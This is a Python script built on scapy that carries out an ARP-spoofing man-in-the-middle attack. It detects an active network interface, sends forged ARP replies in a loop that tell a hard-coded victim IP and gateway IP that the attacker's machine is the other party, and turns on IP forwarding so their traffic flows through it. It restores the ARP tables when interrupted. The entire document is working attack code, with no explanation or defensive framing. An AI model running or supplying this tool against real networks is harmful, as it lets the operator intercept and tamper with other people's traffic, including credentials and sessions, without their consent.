#!/usr/bin/env python3

import scapy.all as scapy
import time
import os

# Detect the active non-loopback network interface
def get_active_interface():
    interfaces = os.listdir('/sys/class/net/')
    for iface in interfaces:
        if iface != "lo" and os.system(f"ip link show {iface} | grep 'state UP' > /dev/null") == 0:
            return iface
    raise Exception("No active interface found!")

# Get the MAC address of a device
def get_mac(ip):
    arp_req = scapy.ARP(pdst=ip)
    broadcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
    req_broadcast = broadcast / arp_req
    answered = scapy.srp(req_broadcast, timeout=1, verbose=False, iface=INTERFACE)[0]
    return answered[0][1].hwsrc if answered else None

# Send spoofed ARP reply to target
def spoof(target_ip, spoof_ip):
    target_mac = get_mac(target_ip)
    if not target_mac:
        print(f"[!] Could not get MAC for {target_ip}")
        return
    arp = scapy.ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=spoof_ip)
    packet = scapy.Ether(dst=target_mac) / arp
    scapy.sendp(packet, iface=INTERFACE, verbose=False)
    print(f"[+] Spoofed {target_ip} saying I am {spoof_ip}")

# Restore the ARP tables (optional)
def restore(target_ip, spoof_ip):
    target_mac = get_mac(target_ip)
    spoof_mac = get_mac(spoof_ip)
    if target_mac and spoof_mac:
        packet = scapy.ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=spoof_ip, hwsrc=spoof_mac)
        scapy.send(packet, count=5, iface=INTERFACE, verbose=False)
        print(f"[!] Restored ARP for {target_ip}")

# ========== CONFIGURATION ==========
INTERFACE = get_active_interface()
print(f"[*] Using interface: {INTERFACE}")

VICTIM_IP = "192.168.223.152"     # Device to spoof
GATEWAY_IP = "192.168.223.186"    # Pretending to be this (could be router or another node)

# Enable IP forwarding for MITM routing
os.system("echo 1 > /proc/sys/net/ipv4/ip_forward")

# ========== MAIN LOOP ==========
try:
    print(f"[*] Spoofing {VICTIM_IP} ⇄ {GATEWAY_IP} (Full MITM)...")
    count = 0
    while True:
        spoof(VICTIM_IP, GATEWAY_IP)    # Tell victim "I'm the gateway"
        spoof(GATEWAY_IP, VICTIM_IP)    # Tell gateway "I'm the victim"
        count += 2
        print(f"\r[*] Packets sent: {count}", end="")
        time.sleep(2)
except KeyboardInterrupt:
    print("\n[!] Detected CTRL+C... restoring ARP tables.")
    restore(VICTIM_IP, GATEWAY_IP)
    restore(GATEWAY_IP, VICTIM_IP)
    os.system("echo 0 > /proc/sys/net/ipv4/ip_forward")
    print("[*] Cleanup done. Exiting.")
